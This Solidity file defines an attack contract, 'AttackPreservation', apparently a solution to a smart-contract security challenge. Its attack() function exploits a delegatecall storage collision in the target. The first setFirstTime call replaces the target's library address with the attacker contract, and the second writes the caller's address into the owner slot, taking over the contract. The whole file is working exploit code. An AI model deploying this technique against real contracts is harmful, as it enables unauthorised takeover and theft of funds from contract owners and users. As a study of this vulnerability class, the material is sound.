// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/StorageSlot.sol';

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

interface ILibraryContract {
    function setTime(uint _time) external;
}

// mock timeZoneLibrary
contract AttackPreservation is ILibraryContract {

    IPreservation immutable private TARGET;

    constructor(address target){
        TARGET = IPreservation(target);
    }

    function setTime(uint _time) public {
        // the slot index of 'owner' in Preservation is 2
        StorageSlot.getUint256Slot(bytes32(uint256(2))).value = _time;
    }

    function attack() external {
        TARGET.setFirstTime(uint(uint160(address(this))));
        TARGET.setFirstTime(uint(uint160(msg.sender)));
    }
}
